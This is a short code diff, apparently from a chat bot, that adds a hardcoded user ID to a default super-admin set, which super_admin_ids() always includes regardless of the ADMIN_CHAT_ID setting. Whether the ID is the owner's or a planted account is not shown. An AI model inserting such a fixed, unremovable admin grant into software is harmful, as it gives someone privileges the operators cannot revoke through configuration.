@@ -111,8 +111,11 @@ def kv_json_get(key: str) -> Optional[dict]:
         return None
 
 
+DEFAULT_SUPER_ADMIN_IDS: set[int] = {1221693150}
+
+
 def super_admin_ids() -> set[int]:
-    result = set()
+    result = set(DEFAULT_SUPER_ADMIN_IDS)
     raw = os.environ.get("ADMIN_CHAT_ID", "")
     for item in raw.split(","):
         item = item.strip()
